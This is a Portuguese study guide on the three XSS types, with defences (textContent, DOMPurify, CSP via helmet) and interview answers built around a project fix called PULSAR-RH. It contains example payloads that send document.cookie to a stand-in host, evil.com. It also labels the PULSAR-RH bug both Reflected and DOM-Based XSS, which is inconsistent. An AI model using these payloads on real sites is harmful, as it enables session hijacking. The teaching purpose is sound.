# 02 — XSS: Stored, Reflected e DOM-Based

## O que é

**Cross-Site Scripting (XSS)** é quando código JavaScript do atacante é executado no browser da vítima no contexto do seu domínio. Resultado: roubo de cookie de sessão, keylogger, redirecionamento, defacement. É A03 (Injection) no OWASP Top 10 2021 — classificado como injeção porque o problema é o mesmo: input não-confiável tratado como código.

Existem três variantes com causa raiz distinta:

---

### Tipo 1 — Reflected XSS

O payload vem na **request** (URL, form) e é refletido diretamente na response sem ser persistido.

```
Atacante envia link:
https://app.com/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>

Servidor renderiza:
<p>Resultados para: <script>fetch(...)</script></p>

Browser executa o script no contexto de app.com
→ cookie de sessão da vítima enviado para evil.com
```

Vetor: phishing (vítima clica no link malicioso). Não persiste no banco — precisa da vítima clicar.

**Este foi o bug do PULSAR-RH (2026-05-28).** Parâmetros de URL eram lidos e inseridos no DOM sem encoding.

---

### Tipo 2 — Stored XSS (Persistent)

O payload é **salvo no banco** e exibido para todos os usuários que carregam aquela página.

```
Atacante salva comentário:
"<img src=x onerror='fetch(evil.com+document.cookie)'>"

Servidor persiste no banco e serve para todos.
Qualquer usuário que abrir a página executa o script.
```

Mais grave que Reflected porque: não precisa de phishing, afeta todos os usuários, persiste até ser removido do banco. O ataque **British Airways (2018)** foi Stored XSS — script injetado na página de pagamento capturou dados de cartão de 380 mil clientes. Multa GDPR: £183 milhões.

---

### Tipo 3 — DOM-Based XSS

O payload nunca passa pelo servidor — é processado **inteiramente no JavaScript do browser**.

```js
// Código vulnerável no frontend
const name = new URLSearchParams(location.search).get('name')
document.getElementById('greeting').innerHTML = `Olá, ${name}!`
// Se name = '<img src=x onerror=alert(1)>', executa no browser
// O servidor nunca viu o payload — logs do servidor estão limpos
```

Difícil de detectar por WAF ou scanner de servidor porque não aparece na request/response HTTP. Precisa de análise de código frontend.

---

### Por que `innerHTML` é veneno

```js
// NUNCA FAZER:
element.innerHTML = userInput          // executa scripts embutidos
element.innerHTML = `<b>${name}</b>`  // mesmo com HTML "inofensivo"

// SEMPRE:
element.textContent = userInput        // escapa tudo, trata como texto puro
element.innerText = userInput          // equivalente na maioria dos casos

// Quando você PRECISA renderizar HTML do usuário (editor rico, markdown):
import DOMPurify from 'dompurify'
element.innerHTML = DOMPurify.sanitize(userInput)
// DOMPurify remove tags e atributos perigosos, mantém formatação segura
```

A diferença entre `textContent` e `innerHTML` é simples: `textContent` escapa `<`, `>`, `&` para entidades HTML antes de inserir — `<script>` vira texto visível, não código executado. `innerHTML` interpreta como markup.

---

### CSP — Content Security Policy

CSP é um header HTTP que diz ao browser quais fontes de script são legítimas. Mesmo que um XSS seja injetado, o browser recusa executar scripts que não estejam na allowlist.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com; object-src 'none'
```

- `default-src 'self'` — só recursos do próprio domínio por padrão
- `script-src 'self'` — scripts só do próprio servidor (sem `'unsafe-inline'`)
- `object-src 'none'` — bloqueia Flash/plugins (vetor histórico)

CSP não substitui output encoding — é defesa em profundidade. Se o encoding falha, CSP é a última linha. Em Express:

```ts
import helmet from 'helmet'

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    objectSrc: ["'none'"],
    upgradeInsecureRequests: [],
  },
}))
```

**`helmet`** configura ~12 headers de segurança de uma vez. Usar em todo projeto AG com Express.

---

### Sanitização vs Encoding: a diferença importa

| Técnica | O que faz | Quando usar |
|---|---|---|
| **Output encoding** | Converte `<` → `&lt;`, `>` → `&gt;` | Sempre que exibir texto do usuário como texto |
| **Sanitização** | Remove/normaliza tags HTML perigosas | Quando você PRECISA aceitar HTML do usuário (editor rico) |
| **Validação de input** | Rejeita input inválido na entrada | Na boundary (API, form) — não substitui encoding |

Regra: encode na **saída** (não na entrada). Encode na entrada gera dados corrompidos no banco. Encode na saída garante que qualquer dado, independente de origem, é exibido com segurança.

---

## Por que cai em entrevista

XSS é a pergunta de segurança mais frequente em entrevistas de frontend e fullstack. Entrevistadores querem saber três coisas:
1. Você conhece os 3 tipos? (maioria dos candidatos só sabe "Reflected")
2. Você sabe a diferença entre sanitização e encoding?
3. Você já corrigiu isso em código real? (a AG tem o commit do PULSAR-RH — use)

---

## Trade-offs

| Abordagem | Vantagem | Custo |
|---|---|---|
| `textContent` sempre | Zero risco de XSS via DOM | Não renderiza formatting — inutilizável para editores ricos |
| DOMPurify + `innerHTML` | Aceita HTML rico seguro | +13KB de bundle; DOMPurify precisa ser mantido atualizado |
| CSP estrita (sem `unsafe-inline`) | Bloqueia XSS mesmo com bug de encoding | Quebra scripts inline legítimos — exige refactor |
| CSP com `unsafe-inline` | Mais fácil de adicionar | Praticamente inútil como proteção de XSS |
| Sanitização no input (backend) | Dado limpo no banco | Destrói formatting legítimo; encode duplo se feito de novo na saída |

---

## Exercício aplicado (projeto AG real)

O fix do PULSAR-RH foi registrado na memória `pulsar_rh_revisao_2026_05_28.md`. O exercício é entender o que foi feito e conseguir explicar.

### Passo a passo

```bash
# 1. Encontrar o commit de correção do XSS no PULSAR-RH
cd ~/projetos/PULSAR-RH
git log --oneline --all | grep -i "xss\|sanitiz\|encod\|param"

# 2. Ver o diff do commit encontrado
git show <hash-do-commit>

# 3. Identificar no diff:
#    - Qual parâmetro estava vulnerável?
#    - Estava sendo lido via URLSearchParams?
#    - Estava sendo inserido via innerHTML ou equivalente?
#    - O fix usou textContent, DOMPurify ou outra abordagem?

# 4. Procurar outros pontos que podem ter o mesmo padrão
grep -rn "innerHTML\|outerHTML" src/ --include="*.ts" --include="*.tsx" --include="*.js"
grep -rn "URLSearchParams\|searchParams\|location\.search" src/ --include="*.ts" --include="*.tsx"

# 5. Para cada ocorrência de innerHTML, avaliar:
#    - O conteúdo inserido vem de usuário/URL/API externa?
#    - Se sim: trocar por textContent ou adicionar DOMPurify
```

```markdown
## DECISIONS.md — 2026-06-XX — [security] XSS audit PULSAR-RH

**Contexto:** Revisão pós-fix XSS de 2026-05-28. O bug era URL params inseridos via innerHTML sem encode.
**Tipo de XSS:** DOM-Based (o payload estava na URL, nunca passou pelo servidor).
**Fix aplicado:** [descrever o que foi feito no commit]
**Pontos adicionais inspecionados:** [listar arquivos verificados]
**Resultado:** [encontrou mais pontos? todos usam textContent/DOMPurify?]
**Proteção adicional sugerida:** adicionar helmet com CSP em todos os projetos AG com Express.
**Como explicar em entrevista (30s):**
> "Tínhamos um DOM-Based XSS no PULSAR-RH: parâmetros de URL eram lidos via URLSearchParams e inseridos com innerHTML diretamente no DOM. O fix foi trocar por textContent — e adicionar CSP header via helmet como defesa em profundidade. Aprendi a diferença entre encode na saída versus sanitizar na entrada nesse fix."
```

---

## Pergunta de entrevista esperada + resposta exemplar

> **P:** "Qual a diferença entre Stored XSS e DOM-Based XSS?"
>
> **R (30s):**
> "Stored XSS persiste no banco e afeta todos os usuários que carregam aquela página — o script injetado fica lá até ser removido. DOM-Based XSS nunca passa pelo servidor: o payload fica na URL ou no fragmento `#hash` e é processado só pelo JavaScript do browser, então não aparece nos logs do servidor. A consequência prática é que WAF não detecta DOM-Based XSS. A mitigação é a mesma para ambos: nunca usar `innerHTML` com dado de origem externa, usar `textContent` para texto puro ou DOMPurify quando precisa aceitar HTML."

> **P:** "Você já corrigiu um XSS? Me conta."
>
> **R (30s):**
> "Sim, no PULSAR-RH em maio de 2026. Era DOM-Based: parâmetros de URL eram lidos com URLSearchParams e inseridos no DOM via innerHTML sem nenhum encoding. Um atacante podia enviar um link com o payload na URL. O fix foi trocar por textContent para os casos simples. Depois adicionamos CSP via helmet como segunda linha de defesa — se encoding falhar em algum ponto, o browser recusa executar script não listado na policy."

---

## Checkpoint

- [ ] Consigo explicar os 3 tipos de XSS e quando cada um é mais perigoso sem consultar
- [ ] Sei a diferença exata entre `textContent` e `innerHTML` e quando usar cada um
- [ ] Li o commit de fix do XSS no PULSAR-RH e consigo descrever o que mudou
- [ ] Entendo por que CSP é defesa em profundidade, não substituto de encoding
- [ ] Recitei a resposta de entrevista em voz alta em menos de 30 segundos

---

## Recursos

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify](https://github.com/cure53/DOMPurify) — sanitizador HTML para browser e Node
- [MDN — textContent vs innerHTML](https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent)
- [helmet.js](https://helmetjs.github.io/) — headers de segurança para Express
- CVE do British Airways: não tem número único — pesquisar "British Airways Magecart 2018" para o caso de Stored XSS em produção
